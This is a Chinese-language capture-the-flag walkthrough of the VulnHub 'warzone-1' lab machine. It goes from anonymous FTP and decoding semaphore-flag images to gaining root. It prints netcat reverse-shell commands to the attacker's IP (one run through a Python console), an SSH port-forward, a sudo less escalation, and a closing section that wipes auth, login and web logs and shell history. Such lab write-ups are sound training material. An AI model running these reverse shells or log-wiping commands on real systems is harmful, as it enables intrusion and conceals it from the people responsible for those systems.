# 前言

靶机：`warzone-1`，IP地址`192.168.1.71`

攻击：`kali`，IP地址`192.168.1.16`

都采用虚拟机，网卡为桥接模式

# 主机发现

因为都是同一局域网下，相当于内网环境，所以使用下面的工具，若想要真实模拟外网。可以使用`nmap`等工具

使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`扫描

![](D:\stu\vulnhub\warzone靶场\pic-2\1.jpg)

# 信息收集

## 使用nmap扫描端口

![](D:\stu\vulnhub\warzone靶场\pic-2\2.jpg)

![2-1](D:\stu\vulnhub\warzone靶场\pic-2\2-1.jpg)

## FTP服务探测

尝试使用匿名用户`anonymous`空密码登录测试，发现可以登录成功，并发现目录及目录下的三张PNG图片

![](D:\stu\vulnhub\warzone靶场\pic-2\3.jpg)

把这些图片下载到`kali`中

![](D:\stu\vulnhub\warzone靶场\pic-2\4.jpg)

查看图片信息，发现`username.png`和`password.png`是一种旗帜。应该是某种加密方法

![](D:\stu\vulnhub\warzone靶场\pic-2\5.jpg)

直接百度搜索旗语，发现海军旗语与之对应

![](D:\stu\vulnhub\warzone靶场\pic-2\6.jpg)

把两个图片中的信息进行按行一一对比，假设这里都是字母，并没有数字，若是数字结合起来，情况就有点太多，这应该不是靶场作者的目的

`username.png`中为`SEMAPHORE`，转为小写后`semaphore`

`password.png`中为`SIGNALPERSON`，转为小写后`signalperson`

查看`token.png`，发现是一种加密

![](D:\stu\vulnhub\warzone靶场\pic-2\7.jpg)



按照这种方式进行加密，先把`hash`中的`username+password`

`semaphoresignalperson`

```shell
echo -n "semaphoresignalperson" | openssl dgst -sha256
#-n放置换行符
#最终输出结果，hash等于
hash=833ad488464de1a27d512f104b639258e77901f14eab706163063d34054a7b26
```

![](D:\stu\vulnhub\warzone靶场\pic-2\8.jpg)

再进行16进制转换

![](D:\stu\vulnhub\warzone靶场\pic-2\9.jpg)

结果为`383333616434383834363464653161323764353132663130346236333932353865373739303166313465616237303631363330363364333430353461376232360a`

不过这里获取到之后，还不知道有什么用

## 1337端口

之前在`nmap`扫描的时候，对于1337端口就比较特别，尝试浏览器访问，发现无内容，说明并非`http`服务。尝试`nc`连接这个端口，看有无信息，发现有信息

尝试把上面的信息结合起来，输入用户名和密码以及`token`，不过这里的`token`与图片中不符，是`hash`值

![](D:\stu\vulnhub\warzone靶场\pic-2\10.jpg)

提示三种命令可用，那么尝试使用`nc`构造反弹`shell`

在靶机构造`payload`

```shell
nc -e /bin/bash 192.168.1.16 9999
#ip地址为kali的地址
```

不过需要先在`kali`中开启监听

```shell
nc -lvvp 9999
```

![](D:\stu\vulnhub\warzone靶场\pic-2\11.jpg)

使用`dpkg -l | grep python`，查看靶机内有无安装`python`，发现`python3`

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

查看当前目录下的文件，发现一个目录，并非常见目录，进入查看，发现三个文件，其中一个为密码

发现密码`i_hate_signals!`

![](D:\stu\vulnhub\warzone靶场\pic-2\12.jpg)

剩下的两个文件，`sh`脚本执行`jar`文件，把该文件下载到`kali`中，反编译后，发现为启动`1337`服务的代码

![](D:\stu\vulnhub\warzone靶场\pic-2\13.jpg)

# 提权

## 提权至flagman

因为这个文件是在用户`flafman`用户家目录下的，所以猜测发现的密码是其密码，然后使用`ssh`连接登录

![](D:\stu\vulnhub\warzone靶场\pic-2\14.jpg)

查看`flag`

![](D:\stu\vulnhub\warzone靶场\pic-2\14-1.jpg)

## 提权至admiral

使用`find`寻找具有SUID权限的文件，发现`sudo`，尝试查看该文件，发现没有权限

![](D:\stu\vulnhub\warzone靶场\pic-2\15.jpg)

尝试以`admiral`执行脚本

![](D:\stu\vulnhub\warzone靶场\pic-2\15.jpg)

发现开启了某种服务，并且给出了一个PIN值

![](D:\stu\vulnhub\warzone靶场\pic-2\16.jpg)

不过是开启在靶机内的地址端口，不过这里可以使用`ssh`连接，那么就可以尝试在`kali`中进行端口转发，把靶机内的本地服务进行转发

```shell
ssh -L 5000:127.0.0.1:5000 flagman@192.168.1.71 -Nf
```

![](D:\stu\vulnhub\warzone靶场\pic-2\17.jpg)

在`kali`浏览器访问本地的`5000`端口

![](D:\stu\vulnhub\warzone靶场\pic-2\18.jpg)

尝试进行目录爆破

```shell
gobuster dir -u http://127.0.0.1:5000 -w /usr/share/wordlists/dirb/big.txt -b 404,403
```

![](D:\stu\vulnhub\warzone靶场\pic-2\19.jpg)

访问`console`，发现需要提供一个PIN，在前面开启脚本的时候，有一个PIN的提示，输入前面的PIN后，发现获取一个类似终端的界面，测试使用，结合前面的脚本为`py`，确定为`python`终端

![](D:\stu\vulnhub\warzone靶场\pic-2\20.jpg)

那么尝试进行`python`的反弹`shell`，在`kali`中先进行监听，不过测试后发现`bash`反弹无效，更换为`nc`反弹，不过这里并未显示`nc`反弹命令，但是直接反弹成功

```shell
import os
os.system("nc -e /bin/sh 192.168.1.16 7777")
```

![](D:\stu\vulnhub\warzone靶场\pic-2\21.jpg)

使用`python3`获取交互式界面，然后查看其目录下的`flag`

![](D:\stu\vulnhub\warzone靶场\pic-2\22.jpg)

## 提权至root

还是测试`sudo -l`，发现无需密码，并且是一个`less`提权

![](D:\stu\vulnhub\warzone靶场\pic-2\23.jpg)

可以借助网站`gtfobins.github.io`查看其他方式

![](D:\stu\vulnhub\warzone靶场\pic-2\24.jpg)

提权成功

![](D:\stu\vulnhub\warzone靶场\pic-2\25.jpg)

# 清理痕迹

清除日志

```shell
sed -i "/192.168.1.16/d" /var/log/auth.log
echo > /var/log/btmp
echo > /var/log/wtmp
echo > /var/log/faillog
echo > /var/log/lastlog
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
```

剩下还需要清除开启服务时的一些日志

清理历史命令记录

```shell
history -r
history -c
```

# 总结

该靶场考察以下几点：

1. 一些加密，这里是海军旗帜加密
2. 学会分析代码，根据代码解出密码
3. 学会查看隐藏文件，在linux中的隐藏文件以`.`开头
4. 当有`ssh`服务连接时，可以把靶机的本地地址端口进行转发
5. 然后会各种反弹`shell`，`bash`、`nc`等
6. 学会`python`提权
7. 学会`sudo`提权，这里是`less`



































































